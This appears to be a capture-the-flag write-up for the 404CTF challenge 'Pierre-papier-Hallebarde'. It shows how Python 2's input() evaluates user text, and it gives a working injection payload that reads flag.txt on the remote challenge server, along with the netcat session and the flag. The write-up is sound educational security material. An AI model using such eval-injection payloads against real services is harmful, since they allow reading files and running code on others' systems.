# Misc / Pierre-papier-Hallebarde

## Challenge
Hallebarde a mis en place sa variante du Pierre-papier-ciseaux. À ce jour, personne de nos services n'est parvenu à vaincre l'ordinateur. Montrez-leur de quoi vous êtes capable en récupérant leur précieux flag.txt !

## Inputs
- server: `challenge.404ctf.fr:30806`
- Python script: [pierre-papier-hallebarde.py](./pierre-papier-hallebarde.py)

## Solution
It is worth noting:
- the python script is based on Python `v2.7`, which is deprecated
- the python script is called with option `-u`, which, as the man page says `Force  stdin,  stdout  and  stderr to be totally unbuffered`

Let's run the code and see what it does. Essentially, whatever integer is provided, we either loose or hit an invalid choice.

```console
$ chmod +x ./pierre-papier-hallebarde.py
$ ./pierre-papier-hallebarde.py
Bienvenue sur pierre-papier-Hallebarde !
La pierre bat la Hallebarde, le papier bat la pierre et la Hallebarde bat le papier
Pour jouer entrez un chiffre entre 1 et 3 :
1 : pierre
2 : papier
3 : Hallebarde
Choix ?
> 1
Vous avez choisi : pierre. L'ordinateur a choisi : papier.
Vous avez perdu...
Choix ?
> 2
Vous avez choisi : papier. L'ordinateur a choisi : Hallebarde.
Vous avez perdu...
Choix ?
> 3
Vous avez choisi : Hallebarde. L'ordinateur a choisi : pierre.
Vous avez perdu...
Choix ?
> 4
Choix invalide. Vous avez perdu
```

Also, non-integers values are not accepted.

Interestingly, we can have `code execution`, like when providing `decision(2,3)` for instance, although this does not help since we again systematically loose:
```console
$ ./pierre-papier-hallebarde.py
Bienvenue sur pierre-papier-Hallebarde !
La pierre bat la Hallebarde, le papier bat la pierre et la Hallebarde bat le papier
Pour jouer entrez un chiffre entre 1 et 3 :
1 : pierre
2 : papier
3 : Hallebarde
Choix ?
> decision(2,3)
Vous avez choisi : papier. L'ordinateur a choisi : Hallebarde.
Vous avez perdu...
```

So there's no way to hit where `flag.txt` is open and contents printed out in the code. Instead, let's dig into the code execution, which lies in this line:
```python
	choix_utilisateur = int(input("Choix ?\n> "))
```

Vulnerability: `input()` is known to be prone to code execution in python 2.x and `raw_input()` shall be used instead. Essentially `input()` is equivalent to `eval(raw_input)`, as explained here for example https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html

So we want a oneliner command that opens `flag.txt`, reads its contents and writes it to `stdout`. This will we evaluated and then cast into a int, which obviously will fail. So The `-u` option comes handy, as it should allow stdout to be flushed immediately before the program actually fails.
```console
$ nc challenge.404ctf.fr 30806
Bienvenue sur pierre-papier-Hallebarde !
La pierre bat la Hallebarde, le papier bat la pierre et la Hallebarde bat le papier
Pour jouer entrez un chiffre entre 1 et 3 :
1 : pierre
2 : papier
3 : Hallebarde
Choix ?
> __import__("sys").stdout.write(open("flag.txt","r").read())
404CTF{cH0iX_nUm3r0_4_v1c701r3}
```

## Flag
404CTF{cH0iX_nUm3r0_4_v1c701r3}
